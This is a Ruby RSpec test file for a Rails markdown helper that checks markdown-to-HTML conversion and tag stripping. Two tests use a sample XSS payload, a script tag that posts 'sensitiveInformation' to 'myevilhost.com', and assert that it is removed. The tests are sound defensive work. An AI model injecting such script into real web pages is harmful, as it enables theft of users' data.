require 'rails_helper'

RSpec.describe MarkdownHelper do
  describe 'markdown' do
    it 'changing markdown to html' do
      input = '**Strong text** *Italics*'
      result = helper.markdown(input)

      result.should include('<strong>')
      result.should include('<em>')
    end

    it 'does not allow XSS' do
      xss = "<script>$.ajax('myevilhost.com', { data: sensitiveInformation })</script>"
      result = helper.markdown(xss)

      result.should_not include('<script>')
      result.should_not include('</script>')
    end
  end

  describe 'plain' do
    it 'does not allow XSS' do
      xss = "<script>$.ajax('myevilhost.com', { data: sensitiveInformation })</script>"
      result = helper.markdown_plain(xss)

      result.should_not include('<script>')
      result.should_not include('</script>')
    end

    it 'remove html-tags' do
      input = '**Strong text** *Italics*'
      result = helper.markdown_plain(input)

      result.should_not include('<strong>')
      result.should_not include('<em>')
    end
  end
end
